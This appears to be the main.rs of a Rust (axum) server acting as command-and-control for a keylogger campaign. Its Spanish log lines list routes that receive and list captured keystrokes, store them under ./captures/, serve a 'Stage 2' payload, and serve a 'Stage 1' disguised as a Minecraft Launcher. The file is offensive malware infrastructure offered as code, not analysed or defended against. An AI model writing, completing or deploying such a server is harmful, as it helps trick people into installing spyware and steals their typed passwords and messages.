// main.rs
mod routes;
mod storage;
mod crypto;

use axum::Router;
use tower_http::cors::{CorsLayer, Any};
use std::net::SocketAddr;
use tokio::net::TcpListener;

#[tokio::main]
async fn main() {
    let storage = storage::Storage::new();

    let app = Router::new()
        .nest("/api", routes::create_routes(storage.clone()))
        .route("/payload", axum::routing::get(routes::serve_payload))
        .route("/download/stage1", axum::routing::get(routes::serve_stage1_app))
        .layer(CorsLayer::new().allow_origin(Any));

    let addr = SocketAddr::from(([0, 0, 0, 0], 8080));
    println!("🚀 Servidor en http://{}", addr);
    println!("   POST /api/keys          - Recibir teclas");
    println!("   GET  /api/keys          - Ver todas las teclas");
    println!("   GET  /payload           - Descargar Stage 2");
    println!("   GET  /download/stage1   - Descargar Minecraft Launcher (Stage 1)");  // <--- NUEVO
    println!("📁 Las teclas se guardan en ./captures/");

    let listener = TcpListener::bind(addr).await.unwrap();
    axum::serve(listener, app).await.unwrap();
}
